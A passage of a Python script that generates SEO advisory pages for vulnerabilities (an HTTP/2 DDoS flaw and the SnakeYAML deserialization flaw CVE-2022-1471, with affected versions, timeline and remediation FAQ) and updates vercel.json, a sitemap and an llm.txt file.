        ("Is CVE-2023-44487 still a threat in 2026?","Yes — CISA KEV confirms ongoing exploitation. Any unpatched HTTP/2 server is still vulnerable to record-breaking DDoS volumes.")
    ]
))

# CVE-2022-1471 — SnakeYAML
write("kev/CVE-2022-1471", kev_page(
    "CVE-2022-1471","SnakeYAML Unsafe Deserialization","SnakeYAML RCE",9.8,"December 2022",
    "CVE-2022-1471 is a critical remote code execution vulnerability in SnakeYAML. The Yaml.load() method with a Constructor that allows arbitrary class instantiation enables attackers to execute arbitrary code by loading crafted YAML. This is a well-known Java deserialization class of vulnerability — similar to the Commons Collections gadget chains. Affects any Java application that passes untrusted YAML to new Yaml().load().",
    [
        ("Java/Maven","org.yaml:snakeyaml","< 2.0","2.2","/fix/java/snakeyaml"),
        ("Java/Maven","Spring Boot (transitive)","< 3.0.0 uses SnakeYAML 1.x","3.x (includes SnakeYAML 2.0)","/fix/java/snakeyaml"),
    ],
    [("Java","/fix/java/snakeyaml")],
    [
        ("Dec 2022","CVE published. SnakeYAML 2.0 released with safe-by-default constructor."),
        ("Jan 2023","CISA adds to KEV catalog. Exploitation confirmed in wild."),
        ("2023–2026","Ongoing exploitation — SnakeYAML 1.x remains widely deployed."),
    ],
    [
        ("What is CVE-2022-1471?","CVE-2022-1471 is an RCE vulnerability in SnakeYAML < 2.0. The Yaml().load() method with default settings allows YAML to instantiate arbitrary Java classes. Attackers craft YAML that calls Runtime.exec() or other dangerous constructors to execute code on the server."),
        ("Am I affected if I use Yaml.load()?","If you use new Yaml().load(untrustedInput), you are vulnerable. SafeConstructor or SnakeYAML 2.0's safe-by-default mode removes the dangerous class instantiation. Even using new Yaml(new SafeConstructor()) in 1.x is safer but upgrading to 2.0+ is the correct fix."),
        ("What is the fix for CVE-2022-1471?","Upgrade snakeyaml to 2.0 or later. In SnakeYAML 2.0, the default constructor no longer allows arbitrary class instantiation. Replace new Yaml().load() with new Yaml(new SafeConstructor(new LoaderOptions())).load() if upgrading is not immediately possible."),
        ("Does Spring Boot include SnakeYAML?","Yes. Spring Boot 2.x includes SnakeYAML 1.x transitively. Spring Boot 3.0+ includes SnakeYAML 2.0. Upgrading to Spring Boot 3.x resolves this transitively."),
        ("Is CVE-2022-1471 on CISA KEV?","Yes — CISA added CVE-2022-1471 to the Known Exploited Vulnerabilities catalog. Actively exploited in the wild against Java applications using SnakeYAML for configuration or data processing.")
    ]
))

# ══════════════════════════════════════════════════════════════════════════════
# UPDATE CONFIG FILES
# ══════════════════════════════════════════════════════════════════════════════

print("\n📝 Updating vercel.json...")
rewrites = []
for p in all_paths:
    rewrites.append({"source": p, "destination": f"/seo{p}/index.html"})
    rewrites.append({"source": p + "/", "destination": f"/seo{p}/index.html"})

vercel_config = {}
if os.path.exists("vercel.json"):
    with open("vercel.json") as f:
        vercel_config = json.load(f)

existing = vercel_config.get("rewrites", [])
existing_sources = {r["source"] for r in existing}
for r in rewrites:
    if r["source"] not in existing_sources:
        existing.append(r)
        existing_sources.add(r["source"])

vercel_config["rewrites"] = existing
with open("vercel.json", "w") as f:
    json.dump(vercel_config, f, indent=2)
print(f"  ✓ vercel.json — {len(existing)} total rewrites")

print("\n🗺 Updating sitemap-seo.xml...")
new_urls = ""
for p in all_paths:
    freq = "weekly" if p in ["/blog","/blog/weekly-cve-march-2026","/cisa-kev"] else "monthly"
    priority = "0.9" if p.startswith("/kev/") or p == "/blog" else "0.8"
    new_urls += f"""  <url>
    <loc>{BASE_URL}{p}</loc>
    <changefreq>{freq}</changefreq>
    <priority>{priority}</priority>
  </url>\n"""

if os.path.exists("sitemap-seo.xml"):
    with open("sitemap-seo.xml") as f:
        content = f.read()
    updated = content.replace("</urlset>", new_urls + "</urlset>")
else:
    updated = '<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n' + new_urls + "</urlset>"
with open("sitemap-seo.xml", "w") as f:
    f.write(updated)
print(f"  ✓ sitemap-seo.xml — {len(all_paths)} new URLs added")

print("\n🤖 Updating llm.txt...")
with open("llm.txt", "a") as f:
    f.write("\n## Phase 5 — Blog + KEV Pages\n")
    for p in all_paths:
        f.write(f"{BASE_URL}{p}\n")
print("  ✓ llm.txt updated")

print(f"\n✅ Done — {len(all_paths)} Phase 5 pages")
for p in all_paths:
    print(f"   {p}")
